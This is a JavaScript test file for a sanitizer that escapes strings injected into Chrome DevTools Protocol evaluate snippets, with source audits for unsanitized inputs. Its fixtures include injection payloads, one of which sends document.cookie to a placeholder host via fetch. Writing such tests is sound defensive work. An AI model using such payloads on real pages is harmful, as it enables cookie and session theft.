/**
 * Offline tests for values interpolated into CDP Runtime.evaluate snippets.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { escapeJsString, validateNumber } from '../src/sanitize.js';

describe('escapeJsString', () => {
  const payloads = [
    'AAPL',
    "x'; window.__pwned = true; //",
    'line1\nline2\rline3',
    'backslash\\quote\'mix',
    '\u2028separator\u2029paragraph',
    '\0null-byte',
    '${templateLiteral}',
  ];

  for (const payload of payloads) {
    it(`round-trips ${JSON.stringify(payload)}`, () => {
      const escaped = escapeJsString(payload);
      assert.equal(Function(`return '${escaped}'`)(), payload);
    });
  }

  it('keeps classic single-quote injection inside the string literal', () => {
    const payload = "'); fetch('https://example.invalid/?c=' + document.cookie); ('";
    const expression = `
      var marker = 'safe';
      var value = '${escapeJsString(payload)}';
      return { marker: marker, value: value };
    `;
    const result = Function(expression)();
    assert.equal(result.marker, 'safe');
    assert.equal(result.value, payload);
  });
});

describe('validateNumber', () => {
  it('accepts finite numbers and numeric strings', () => {
    assert.equal(validateNumber(42, 'value'), 42);
    assert.equal(validateNumber('3.5', 'value'), 3.5);
    assert.equal(validateNumber(0, 'value'), 0);
  });

  it('rejects non-finite and non-numeric values', () => {
    assert.throws(() => validateNumber(NaN, 'price'), /price must be a finite number/);
    assert.throws(() => validateNumber(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => validateNumber(-Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => validateNumber(undefined, 'value'), /value must be a finite number/);
    assert.throws(() => validateNumber('oops', 'value'), /value must be a finite number/);
  });
});

describe('source safety audit', () => {
  it('does not call hideReplayToolbar from runtime code', () => {
    const source = readFileSync(new URL('../src/core/replay.js', import.meta.url), 'utf8');
    const withoutComments = source
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/\/\/.*$/gm, '');
    assert.ok(!withoutComments.includes('.hideReplayToolbar('));
  });

  it('keeps obvious user-controlled evaluate inputs behind sanitizers', () => {
    const coreDir = fileURLToPath(new URL('../src/core', import.meta.url));
    const files = readdirSync(coreDir).filter((name) => name.endsWith('.js'));
    const source = files.map((name) => readFileSync(join(coreDir, name), 'utf8')).join('\n');
    for (const token of ['entity_id', 'symbol', 'timeframe', 'indicator', 'order_id', 'position_id']) {
      if (!source.includes(token)) continue;
      assert.match(source, new RegExp(`escapeJsString\\(${token}|escapeJsString\\([^\\n]*${token}`));
    }
  });
});
